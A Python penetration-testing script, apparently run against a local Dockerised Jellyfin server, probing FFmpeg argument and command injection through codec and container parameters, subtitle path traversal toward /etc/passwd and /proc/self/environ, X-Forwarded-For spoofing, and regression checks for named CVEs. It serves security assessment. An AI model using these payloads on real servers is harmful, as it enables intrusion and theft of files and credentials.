#!/usr/bin/env python3
"""
COBALT STRIKE II -- Phase 2b: Deep FFmpeg Injection Validation
Follow-up to Phase 2 with:
  - Codec/container validation with transcoding enabled (static=false)
  - PlaybackInfo injection false-positive elimination
  - Unauthenticated media access scope analysis
  - Docker FFmpeg process inspection
  - Subtitle path injection testing
"""

import sys
sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/JellyFin/scripts')

from jellyfin_common import *
import urllib.parse
import subprocess

banner("Phase 2b: Deep FFmpeg Injection Validation")

ec = EvidenceCollector("phase2b_ffmpeg_deep", phase="phase2")
js = JellyfinSession()

if not js.test_connection():
    print("[-] Cannot connect to Jellyfin")
    sys.exit(1)

# Get media items
resp = js.get("/Items", params={
    "Recursive": "true",
    "IncludeItemTypes": "Movie,Audio,Video",
    "Fields": "Path,MediaSources",
})
items = resp.json().get("Items", []) if resp.status_code == 200 else []

movie_id = None
audio_id = None
for item in items:
    if item["Type"] == "Movie" and not movie_id:
        movie_id = item["Id"]
        movie_source = item.get("MediaSources", [{}])[0].get("Id", movie_id)
    elif item["Type"] == "Audio" and not audio_id:
        audio_id = item["Id"]
        audio_source = item.get("MediaSources", [{}])[0].get("Id", audio_id)

if not movie_id:
    print("[-] No movie item found")
    sys.exit(1)

print(f"  Movie ID: {movie_id}")
print(f"  Audio ID: {audio_id}")


# ===========================================================================
# TEST 1: Codec/Container validation WITH transcoding (static=false)
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 1: Codec/Container Validation Under Transcoding")
print("=" * 60)

print("\n  The Phase 2 test used static=true (raw file serve), so validation")
print("  was bypassed. Now testing with actual transcoding requested.\n")

transcode_payloads = [
    # Normal baseline first
    {"param": "VideoCodec", "value": "h264", "desc": "Normal h264 (baseline)"},
    # Pipe character (in regex whitelist)
    {"param": "VideoCodec", "value": "h264|h265", "desc": "Pipe-delimited codec"},
    {"param": "Container", "value": "ts|mp4", "desc": "Pipe-delimited container"},
    # Characters NOT in regex
    {"param": "VideoCodec", "value": "h264$(pwd)", "desc": "Shell subst in codec"},
    {"param": "Container", "value": "ts$(pwd)", "desc": "Shell subst in container"},
    {"param": "VideoCodec", "value": "h264`pwd`", "desc": "Backtick in codec"},
    {"param": "Container", "value": "ts`pwd`", "desc": "Backtick in container"},
    # FFmpeg-meaningful characters
    {"param": "VideoCodec", "value": "h264 -f null", "desc": "Space + FFmpeg args in codec"},
    {"param": "Container", "value": "ts -f null", "desc": "Space + FFmpeg args in container"},
    # Newline injection
    {"param": "VideoCodec", "value": "h264\n-v", "desc": "Newline in codec"},
    # Quote injection
    {"param": "VideoCodec", "value": 'h264"', "desc": "Quote in codec"},
    {"param": "Container", "value": 'ts"', "desc": "Quote in container"},
    # SubtitleCodec (may have different validation)
    {"param": "SubtitleCodec", "value": "srt$(pwd)", "desc": "Shell subst in subtitle codec"},
    {"param": "SubtitleCodec", "value": "srt -f null", "desc": "FFmpeg args in subtitle codec"},
]

for payload in transcode_payloads:
    try:
        params = {
            "static": "false",
            "MediaSourceId": movie_source,
            "AudioCodec": "aac",
            "TranscodingProtocol": "hls",
            "MaxStreamingBitrate": "1000000",
            "SegmentContainer": "ts",
            "MinSegments": "1",
            "BreakOnNonKeyFrames": "true",
        }
        # Set the test parameter
        params[payload["param"]] = payload["value"]
        # Make sure we have a video codec for HLS
        if payload["param"] != "VideoCodec":
            params["VideoCodec"] = "h264"
        if payload["param"] != "Container":
            params["Container"] = "ts"

        resp = js.get(f"/Videos/{movie_id}/master.m3u8", params=params)
        status = resp.status_code

        result = "PASS"
        marker = "  "
        if status == 200:
            # HLS playlist returned -- transcoding accepted the parameter
            content = resp.text[:200]
            has_stream = "#EXTM3U" in content
            if has_stream:
                result = "ANOMALOUS"
                marker = "??"
                print(f"  [{marker}] ACCEPTED (HLS): {payload['desc']} = {payload['value'][:30]}")
            else:
                print(f"  [  ] 200 but not HLS: {payload['desc']}")
        elif status == 400:
            print(f"  [  ] REJECTED (400): {payload['desc']}")
        elif status == 500:
            error = resp.text[:150]
            result = "ANOMALOUS"
            print(f"  [{marker}] SERVER ERROR: {payload['desc']} -- {error[:80]}")
        else:
            print(f"  [  ] HTTP {status}: {payload['desc']}")

        ec.add_test(
            f"TRANSCODE-{payload['param'][:10]}-{payload['desc'][:15]}",
            f"Transcoding validation: {payload['desc']}",
            f"GET /Videos/.../master.m3u8?{payload['param']}={payload['value'][:40]}",
            f"HTTP {status}: {resp.text[:200]}",
            result=result,
        )

        rate_limit(0.3)
    except Exception as e:
        print(f"  [!!] Error: {payload['desc']} -- {e}")


# ===========================================================================
# TEST 2: PlaybackInfo injection -- detailed analysis
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 2: PlaybackInfo Injection Analysis")
print("=" * 60)

print("\n  Checking whether DeviceProfile fields flow into TranscodingUrl")
print("  and whether injection payloads appear in the URL.\n")

injection_profiles = [
    {
        "desc": "Normal baseline",
        "container": "ts",
        "video_codec": "h264",
        "audio_codec": "aac",
    },
    {
        "desc": "Container with quote injection",
        "container": 'ts" -f lavfi -i color',
        "video_codec": "h264",
        "audio_codec": "aac",
    },
    {
        "desc": "Video codec with null output",
        "container": "ts",
        "video_codec": 'h264" -f null /dev/null -i "',
        "audio_codec": "aac",
    },
    {
        "desc": "Audio codec with command injection",
        "container": "ts",
        "video_codec": "h264",
        "audio_codec": "aac$(id)",
    },
    {
        "desc": "All fields injected",
        "container": "ts|null",
        "video_codec": "h264|null",
        "audio_codec": "aac|null",
    },
]

for profile in injection_profiles:
    try:
        body = {
            "DeviceProfile": {
                "MaxStreamingBitrate": 8000000,
                "TranscodingProfiles": [
                    {
                        "Container": profile["container"],
                        "Type": "Video",
                        "VideoCodec": profile["video_codec"],
                        "AudioCodec": profile["audio_codec"],
                        "Context": "Streaming",
                        "Protocol": "hls",
                    }
                ],
                "DirectPlayProfiles": [
                    {
                        "Container": "mp4",
                        "Type": "Video",
                        "VideoCodec": "h264",
                        "AudioCodec": "aac",
                    }
                ],
            }
        }

        resp = js.post(f"/Items/{movie_id}/PlaybackInfo", data=body)
        status = resp.status_code

        if status == 200:
            data = resp.json()
            for ms in data.get("MediaSources", []):
                tc_url = ms.get("TranscodingUrl", "")
                direct_play = ms.get("SupportsDirectPlay", False)
                direct_stream = ms.get("SupportsDirectStream", False)
                transcode = ms.get("SupportsTranscoding", False)

                print(f"  {profile['desc']}:")
                print(f"    DirectPlay={direct_play}, DirectStream={direct_stream}, Transcode={transcode}")

                if tc_url:
                    # Check if injection payloads appear
                    dangerous = any(x in tc_url for x in [
                        "lavfi", "/dev/null", "$(id)", "$(pwd)", "/etc/passwd",
                    ])
                    if dangerous:
                        print(f"    [!!!] INJECTION IN URL: {tc_url}")
                        ec.add_finding(
                            f"PLAYBACK-INJECT-{profile['desc'][:20]}",
                            "CRITICAL",
                            f"FFmpeg injection via PlaybackInfo: {profile['desc']}",
                            f"TranscodingUrl contains injection payload: {tc_url[:300]}",
                            evidence=tc_url,
                        )
                    else:
                        # Show what codec/container ended up in the URL
                        print(f"    TranscodingUrl (first 200): {tc_url[:200]}")

                        # Parse URL params to see what the server chose
                        if "?" in tc_url:
                            url_params = urllib.parse.parse_qs(tc_url.split("?")[1])
                            vc = url_params.get("VideoCodec", ["?"])[0]
                            ac = url_params.get("AudioCodec", ["?"])[0]
                            ct = url_params.get("Container", url_params.get("SegmentContainer", ["?"]))[0]
                            print(f"    Server chose: VideoCodec={vc}, AudioCodec={ac}")
                else:
                    print(f"    No TranscodingUrl (direct play/stream)")
        else:
            print(f"  {profile['desc']}: HTTP {status} -- {resp.text[:100]}")

        ec.add_test(
            f"PLAYBACK-DEEP-{profile['desc'][:20]}",
            f"PlaybackInfo deep: {profile['desc']}",
            f"POST /Items/{movie_id}/PlaybackInfo",
            f"HTTP {status}",
            result="PASS",
        )

        rate_limit(0.3)
    except Exception as e:
        print(f"  [!!] Error: {e}")


# ===========================================================================
# TEST 3: FFmpeg process inspection inside Docker
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 3: FFmpeg Process Inspection")
print("=" * 60)

print("\n  Triggering transcoding and inspecting FFmpeg command line\n")

# First, trigger transcoding
transcode_params = {
    "static": "false",
    "MediaSourceId": movie_source,
    "VideoCodec": "h264",
    "AudioCodec": "aac",
    "Container": "ts",
    "TranscodingProtocol": "hls",
    "MaxStreamingBitrate": "500000",
    "SegmentContainer": "ts",
    "MinSegments": "1",
    "BreakOnNonKeyFrames": "true",
}

resp = js.get(f"/Videos/{movie_id}/master.m3u8", params=transcode_params)
print(f"  Transcoding request: HTTP {resp.status_code}")

if resp.status_code == 200:
    rate_limit(2)

    # Check FFmpeg processes inside container
    try:
        result = subprocess.run(
            ["docker", "exec", "cobalt-jellyfin", "ps", "aux"],
            capture_output=True, text=True, timeout=10,
        )
        lines = result.stdout.strip().split("\n")
        ffmpeg_lines = [l for l in lines if "ffmpeg" in l.lower()]
        if ffmpeg_lines:
            print("  FFmpeg process found:")
            for line in ffmpeg_lines:
                print(f"    {line[:200]}")

            # Get the full command line
            result2 = subprocess.run(
                ["docker", "exec", "cobalt-jellyfin", "bash", "-c",
                 "cat /proc/$(pgrep -f ffmpeg | head -1)/cmdline 2>/dev/null | tr '\\0' ' '"],
                capture_output=True, text=True, timeout=10,
            )
            if result2.stdout.strip():
                cmdline = result2.stdout.strip()
                print(f"\n  Full FFmpeg cmdline ({len(cmdline)} chars):")
                # Split into args for readability
                args = cmdline.split(" -")
                for arg in args[:5]:
                    print(f"    -{arg[:150]}" if not arg.startswith("/") else f"    {arg[:150]}")
                if len(args) > 5:
                    print(f"    ... ({len(args)-5} more arguments)")

                ec.add_test("FFMPEG-CMDLINE", "FFmpeg command line inspection",
                           "docker exec cobalt-jellyfin cat /proc/.../cmdline",
                           cmdline[:1000], result="PASS")
        else:
            print("  No FFmpeg process found (transcoding may have completed)")
    except Exception as e:
        print(f"  [!!] Docker exec error: {e}")


# ===========================================================================
# TEST 4: Unauthenticated media access -- scope analysis
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 4: Unauthenticated Media Access Analysis")
print("=" * 60)

print("\n  Phase 2 found unauth access to video/audio/images.")
print("  Testing scope: can any item be accessed, or only specific ones?\n")

# Get all items
resp = js.get("/Items", params={"Recursive": "true", "Limit": "20",
                                  "Fields": "Path,MediaSources"})
if resp.status_code == 200:
    all_items = resp.json().get("Items", [])
    unauth_accessible = 0
    unauth_blocked = 0

    for item in all_items:
        item_id = item["Id"]
        item_name = item.get("Name", "?")
        item_type = item.get("Type", "?")

        # Test image access (most common)
        resp_img = js.raw_get(f"/Items/{item_id}/Images/Primary")

        # Test stream access for media items
        if item_type in ("Movie", "Audio", "Video", "Episode", "MusicAlbum"):
            if item_type in ("Audio",):
                resp_stream = js.raw_get(f"/Audio/{item_id}/stream?static=true")
            else:
                resp_stream = js.raw_get(f"/Videos/{item_id}/stream?static=true")
        else:
            resp_stream = type('R', (), {'status_code': 'N/A'})()

        img_code = resp_img.status_code
        stream_code = resp_stream.status_code

        if img_code == 200 or stream_code == 200:
            unauth_accessible += 1
            print(f"  [!!] {item_type:15s} {item_name[:30]:30s} img={img_code} stream={stream_code}")
        else:
            unauth_blocked += 1
            print(f"  [  ] {item_type:15s} {item_name[:30]:30s} img={img_code} stream={stream_code}")

        rate_limit(0.1)

    print(f"\n  Summary: {unauth_accessible} accessible, {unauth_blocked} blocked")

    if unauth_accessible > 0:
        ec.add_finding(
            "UNAUTH-MEDIA",
            "MEDIUM",
            f"Unauthenticated access to {unauth_accessible} media items",
            f"Media files (video/audio streams and images) are accessible without "
            f"authentication if the item ID is known. Tested {len(all_items)} items: "
            f"{unauth_accessible} accessible, {unauth_blocked} blocked. "
            f"Item IDs are GUIDs but may be leaked through other endpoints.",
            remediation="Require authentication for all media streaming endpoints. "
                       "Consider the `RequireAuthentication` middleware for static streams.",
        )


# ===========================================================================
# TEST 5: Subtitle path injection
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 5: Subtitle Path Injection")
print("=" * 60)

print("\n  Testing if subtitle parameters can inject file paths.\n")

subtitle_payloads = [
    "/etc/passwd",
    "../../../../../../etc/passwd",
    "/config/data/jellyfin.db",
    "/proc/self/environ",
]

for payload in subtitle_payloads:
    try:
        # Try via streaming endpoint with subtitle parameters
        params = {
            "static": "false",
            "MediaSourceId": movie_source,
            "VideoCodec": "h264",
            "AudioCodec": "aac",
            "Container": "ts",
            "SubtitleStreamIndex": "0",
            "SubtitleMethod": "Encode",
            "SubtitleCodec": "srt",
        }

        resp = js.get(f"/Videos/{movie_id}/master.m3u8", params=params)

        # Also try fetching a subtitle file directly with path traversal
        resp2 = js.get(f"/Videos/{movie_id}/Subtitles/0/0/Stream.srt",
                      params={"api_key": js.access_token})

        # Try a direct subtitle fetch with path manipulation
        traversal_path = urllib.parse.quote(payload, safe='')
        resp3 = js.raw_get(f"/Videos/{movie_id}/Subtitles/{traversal_path}/Stream.srt")

        print(f"  Path: {payload[:50]}")
        print(f"    HLS request: HTTP {resp.status_code}")
        print(f"    Subtitle fetch: HTTP {resp2.status_code}")
        print(f"    Path traversal: HTTP {resp3.status_code}")

        if resp3.status_code == 200 and ("root:" in resp3.text or "PATH=" in resp3.text):
            print(f"    [!!!] PATH TRAVERSAL SUCCESSFUL!")
            ec.add_finding(
                f"SUBTPATH-{payload[:20]}",
                "CRITICAL",
                f"Subtitle path traversal: {payload}",
                f"Accessing /Videos/.../Subtitles/{payload}/Stream.srt "
                f"returned file contents",
                evidence=resp3.text[:500],
            )

        ec.add_test(
            f"SUBTPATH-{payload[:15]}",
            f"Subtitle path: {payload[:30]}",
            f"GET /Videos/.../Subtitles/{payload[:30]}/Stream.srt",
            f"HLS:{resp.status_code}, Sub:{resp2.status_code}, Traversal:{resp3.status_code}",
            result="PASS",
        )

        rate_limit(0.2)
    except Exception as e:
        print(f"  [!!] Error: {e}")


# ===========================================================================
# TEST 6: CVE-2023-48702 -- Encoder path confirmation
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 6: CVE-2023-48702 Regression Confirmation")
print("=" * 60)

print("\n  Source code shows UpdateMediaEncoderPath is a NOOP:")
print("  Line 160: // _mediaEncoder.UpdateEncoderPath(...) -- COMMENTED OUT")
print("  The endpoint returns 204 but does nothing.\n")

ec.add_test(
    "CVE-2023-48702",
    "CVE-2023-48702: RCE via custom FFmpeg binary path",
    "Source code review: ConfigurationController.cs line 160",
    "Endpoint is NOOP -- UpdateEncoderPath call is commented out. "
    "Returns 204 but path is never changed. PATCHED.",
    result="PASS",
)
print("  CVE-2023-48702: PATCHED (endpoint is NOOP)")


# ===========================================================================
# TEST 7: CVE-2025-31499 -- FFmpeg argument injection bypass
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 7: CVE-2025-31499 Regression (FFmpeg Argument Injection)")
print("=" * 60)

print("\n  CVE-2025-31499 was about bypassing the patch for CVE-2023-49096.")
print("  Testing container/codec validation with known bypass patterns.\n")

# From the CVE, injection was possible via codec parameters
# The fix was ContainerValidationRegex: @"^[a-zA-Z0-9\-\._,|]{0,40}$"

cve_payloads = [
    # Direct from CVE-2023-49096 pattern
    {"name": "original_cve", "param": "VideoCodec", "value": "-c:v libx264 -vf drawtext"},
    # CVE-2025-31499 bypass attempt
    {"name": "bypass_pipes", "param": "VideoCodec", "value": "h264|libx264"},
    # Double encoding
    {"name": "double_encode", "param": "VideoCodec", "value": "h264%20-f%20null"},
    # URL encoding in query string
    {"name": "url_encode", "param": "VideoCodec", "value": "h264%22%20-f%20null"},
    # Unicode homoglyph
    {"name": "unicode_space", "param": "VideoCodec", "value": "h264\u00a0-f\u00a0null"},
]

for payload in cve_payloads:
    try:
        params = {
            "static": "false",
            "MediaSourceId": movie_source,
            "AudioCodec": "aac",
            "Container": "ts",
            payload["param"]: payload["value"],
        }
        resp = js.get(f"/Videos/{movie_id}/master.m3u8", params=params)
        status = resp.status_code

        if status == 200 and "#EXTM3U" in resp.text:
            print(f"  [??] {payload['name']}: ACCEPTED (HLS returned)")
        elif status == 400:
            print(f"  [  ] {payload['name']}: REJECTED (400)")
        else:
            print(f"  [  ] {payload['name']}: HTTP {status}")

        ec.add_test(
            f"CVE-2025-31499-{payload['name']}",
            f"CVE-2025-31499 bypass: {payload['name']}",
            f"GET /Videos/.../master.m3u8?{payload['param']}={payload['value'][:40]}",
            f"HTTP {status}",
            result="ANOMALOUS" if status == 200 else "PASS",
        )

        rate_limit(0.3)
    except Exception as e:
        print(f"  [!!] Error: {e}")


# ===========================================================================
# TEST 8: CVE-2025-32012 -- IP spoofing via X-Forwarded-For
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 8: CVE-2025-32012 Regression (IP Spoofing)")
print("=" * 60)

print("\n  Testing if X-Forwarded-For can spoof IP to bypass local access check.\n")

# The LocalAccessOrRequiresElevation policy grants access to local IPs.
# CVE-2025-32012 was about spoofing via X-Forwarded-For.
# Test if the header is trusted.

xff_tests = [
    {"header": "X-Forwarded-For", "value": "127.0.0.1"},
    {"header": "X-Forwarded-For", "value": "[REDACTED-IP]"},
    {"header": "X-Forwarded-For", "value": "[REDACTED-INTERNAL-IP]"},
    {"header": "X-Real-IP", "value": "[REDACTED-IP]"},
    {"header": "X-Forwarded-For", "value": "[REDACTED-INTERNAL-IP], [REDACTED-IP]"},
]

for test in xff_tests:
    try:
        # Test against /System/Info (requires auth normally)
        headers = {test["header"]: test["value"]}
        resp = js.raw_get("/System/Info", headers=headers)

        print(f"  {test['header']}: {test['value']} -> /System/Info: HTTP {resp.status_code}")

        ec.add_test(
            f"XFF-{test['value'][:15]}",
            f"X-Forwarded-For spoofing: {test['value']}",
            f"GET /System/Info with {test['header']}: {test['value']}",
            f"HTTP {resp.status_code}",
            result="VULN" if resp.status_code == 200 else "PASS",
        )

        rate_limit(0.2)
    except Exception as e:
        print(f"  [!!] Error: {e}")


# ===========================================================================
# SUMMARY
# ===========================================================================

print("\n" + "=" * 60)
print("  PHASE 2b SUMMARY")
print("=" * 60)

ec.save()
